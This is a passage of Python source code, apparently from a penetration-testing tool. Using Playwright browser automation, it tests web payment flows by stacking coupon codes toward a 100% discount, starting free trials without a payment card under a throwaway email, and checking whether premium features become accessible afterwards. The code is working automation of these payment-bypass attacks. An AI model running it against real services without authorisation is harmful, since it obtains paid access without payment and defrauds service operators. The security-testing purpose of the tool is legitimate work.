                            coupon_input = await page.wait_for_selector(sel, timeout=3000)
                            if coupon_input:
                                break
                        except Exception:
                            pass

                    if coupon_input:
                        await coupon_input.fill(code)
                        apply_btn = None
                        for sel in [
                            "button:has-text('Apply')", "button:has-text('Redeem')",
                            "[data-testid*='apply']", "button[type='submit']",
                        ]:
                            try:
                                apply_btn = await page.wait_for_selector(sel, timeout=2000)
                                if apply_btn:
                                    break
                            except Exception:
                                pass
                        if apply_btn:
                            await apply_btn.click()
                            await asyncio.sleep(1)

                        content = await page.content()
                        discount_match = re.search(
                            r"(\d+)\s*%\s*off|discount.*?(\d+)%", content, re.I,
                        )
                        if discount_match:
                            pct = int(discount_match.group(1) or discount_match.group(2))
                            total_discount += pct
                            applied.append({"code": code, "discount_pct": pct, "accepted": True})
                        elif not re.search(r"(invalid|expired|not found)", content, re.I):
                            applied.append({"code": code, "accepted": True, "discount_pct": 0})
                        else:
                            applied.append({"code": code, "accepted": False})
                    else:
                        applied.append({"code": code, "accepted": False, "reason": "no coupon input found"})
                except Exception as exc:
                    applied.append({"code": code, "accepted": False, "error": str(exc)})
                result.steps_completed += 1

            result.extracted_data["coupons"] = applied
            result.extracted_data["total_discount_pct"] = total_discount
            if total_discount >= 100:
                result.entitlement_granted = True
                result.amount_charged = 0
                result.extracted_data["vulnerability_confirmed"] = True
                result.extracted_data["finding"] = (
                    f"COUPON-STACKING: Total discount reached {total_discount}% "
                    f"across {len([a for a in applied if a.get('accepted')])} coupons. "
                    f"Full access without payment. CWE-840."
                )
            result.steps_completed = result.total_steps
        except Exception as exc:
            result.errors.append(str(exc))
        finally:
            await browser.close()
            await pw.stop()
            result.timing_ms = int((time.monotonic() - t0) * 1000)
        self._results.append(result)
        return result

    async def test_trial_without_card(self, signup_url: str) -> PaymentFlowResult:
        """Test if a trial can be started without providing a payment method."""
        if not PLAYWRIGHT_AVAILABLE:
            return _unavailable_result(PaymentFlowType.CUSTOM_FORM)
        t0 = time.monotonic()
        result = PaymentFlowResult(flow_type=PaymentFlowType.CUSTOM_FORM, total_steps=3)
        pw, browser, ctx = await self._launch_context()
        try:
            page = await self._new_page(ctx)

            # Step 1: Navigate to signup
            await page.goto(signup_url, wait_until="networkidle", timeout=self._timeout)
            result.steps_completed = 1

            # Step 2: Look for trial signup form and attempt without card
            content = await page.content()
            has_trial = bool(re.search(
                r"(free.trial|start.free|try.free|no.credit.card)", content, re.I,
            ))
            has_card_field = False
            for sel in [
                "input[name*='card']", "#card-element", ".StripeElement",
                "iframe[src*='stripe']", "input[autocomplete='cc-number']",
            ]:
                try:
                    el = await page.query_selector(sel)
                    if el:
                        has_card_field = True
                        break
                except Exception:
                    pass

            result.extracted_data["has_trial_offer"] = has_trial
            result.extracted_data["has_card_field"] = has_card_field
            result.steps_completed = 2

            # Step 3: Try to submit without filling card details
            if has_trial:
                email_field = None
                for sel in [
                    "input[type='email']", "input[name='email']",
                    "input[name='username']", "input[placeholder*='email']",
                ]:
                    try:
                        email_field = await page.query_selector(sel)
                        if email_field:
                            break
                    except Exception:
                        pass
                if email_field:
                    test_email = f"redpilot_test_{int(time.time())}@test.invalid"
                    await email_field.fill(test_email)

                submit = None
                for sel in [
                    "button[type='submit']", "button:has-text('Start')",
                    "button:has-text('Sign up')", "button:has-text('Create')",
                    "button:has-text('Try')", "input[type='submit']",
                ]:
                    try:
                        submit = await page.query_selector(sel)
                        if submit:
                            break
                    except Exception:
                        pass
                if submit:
                    await submit.click()
                    await asyncio.sleep(2)
                    content = await page.content()
                    success = bool(re.search(
                        r"(welcome|dashboard|getting.started|trial.*started|success)",
                        content, re.I,
                    ))
                    card_required = bool(re.search(
                        r"(card.*required|payment.*method.*required|add.*card)",
                        content, re.I,
                    ))
                    if success and not card_required:
                        result.entitlement_granted = True
                        result.extracted_data["vulnerability_confirmed"] = True
                        result.extracted_data["finding"] = (
                            "TRIAL-WITHOUT-CARD: Trial started without providing any "
                            "payment method. User gets access with no payment on file."
                        )
                    result.extracted_data["card_required_on_submit"] = card_required
            result.steps_completed = 3
        except Exception as exc:
            result.errors.append(str(exc))
        finally:
            await browser.close()
            await pw.stop()
            result.timing_ms = int((time.monotonic() - t0) * 1000)
        self._results.append(result)
        return result

    async def verify_entitlement_after_payment(
        self, dashboard_url: str, feature_selectors: list[str],
    ) -> dict[str, Any]:
        """Verify if premium features are accessible on a dashboard page.

        Run this AFTER a bypass test to confirm whether access was actually
        granted.  Takes a list of CSS selectors for premium feature elements.
        """
        if not PLAYWRIGHT_AVAILABLE:
            return {"error": "playwright not available"}
        pw, browser, ctx = await self._launch_context()
        try:
            page = await self._new_page(ctx)
            await page.goto(dashboard_url, wait_until="networkidle", timeout=self._timeout)
            results: dict[str, Any] = {"features": {}}
            for sel in feature_selectors:
                try:
                    el = await page.query_selector(sel)
                    visible = False
                    if el:
                        visible = await el.is_visible()
                    results["features"][sel] = {
                        "exists": el is not None,
                        "visible": visible,
                    }
                except Exception:
                    results["features"][sel] = {"exists": False, "visible": False}
            accessible = sum(1 for v in results["features"].values() if v["visible"])
            results["accessible_features"] = accessible
            results["total_features"] = len(feature_selectors)
            results["entitlement_active"] = accessible > 0
            return results
        except Exception as exc:
            return {"error": str(exc)}
        finally:
            await browser.close()
            await pw.stop()

    def get_all_results(self) -> list[PaymentFlowResult]:
        return list(self._results)

    def get_summary(self) -> dict[str, Any]:
        total = len(self._results)
        confirmed = sum(1 for r in self._results if r.extracted_data.get("vulnerability_confirmed"))
        bypasses = sum(1 for r in self._results if r.entitlement_granted)
        return {
            "total_tests": total,
            "confirmed_vulnerabilities": confirmed,
            "entitlement_bypasses": bypasses,
            "results_by_type": {
                ft.value: sum(1 for r in self._results if r.flow_type == ft)
                for ft in PaymentFlowType
            },
        }
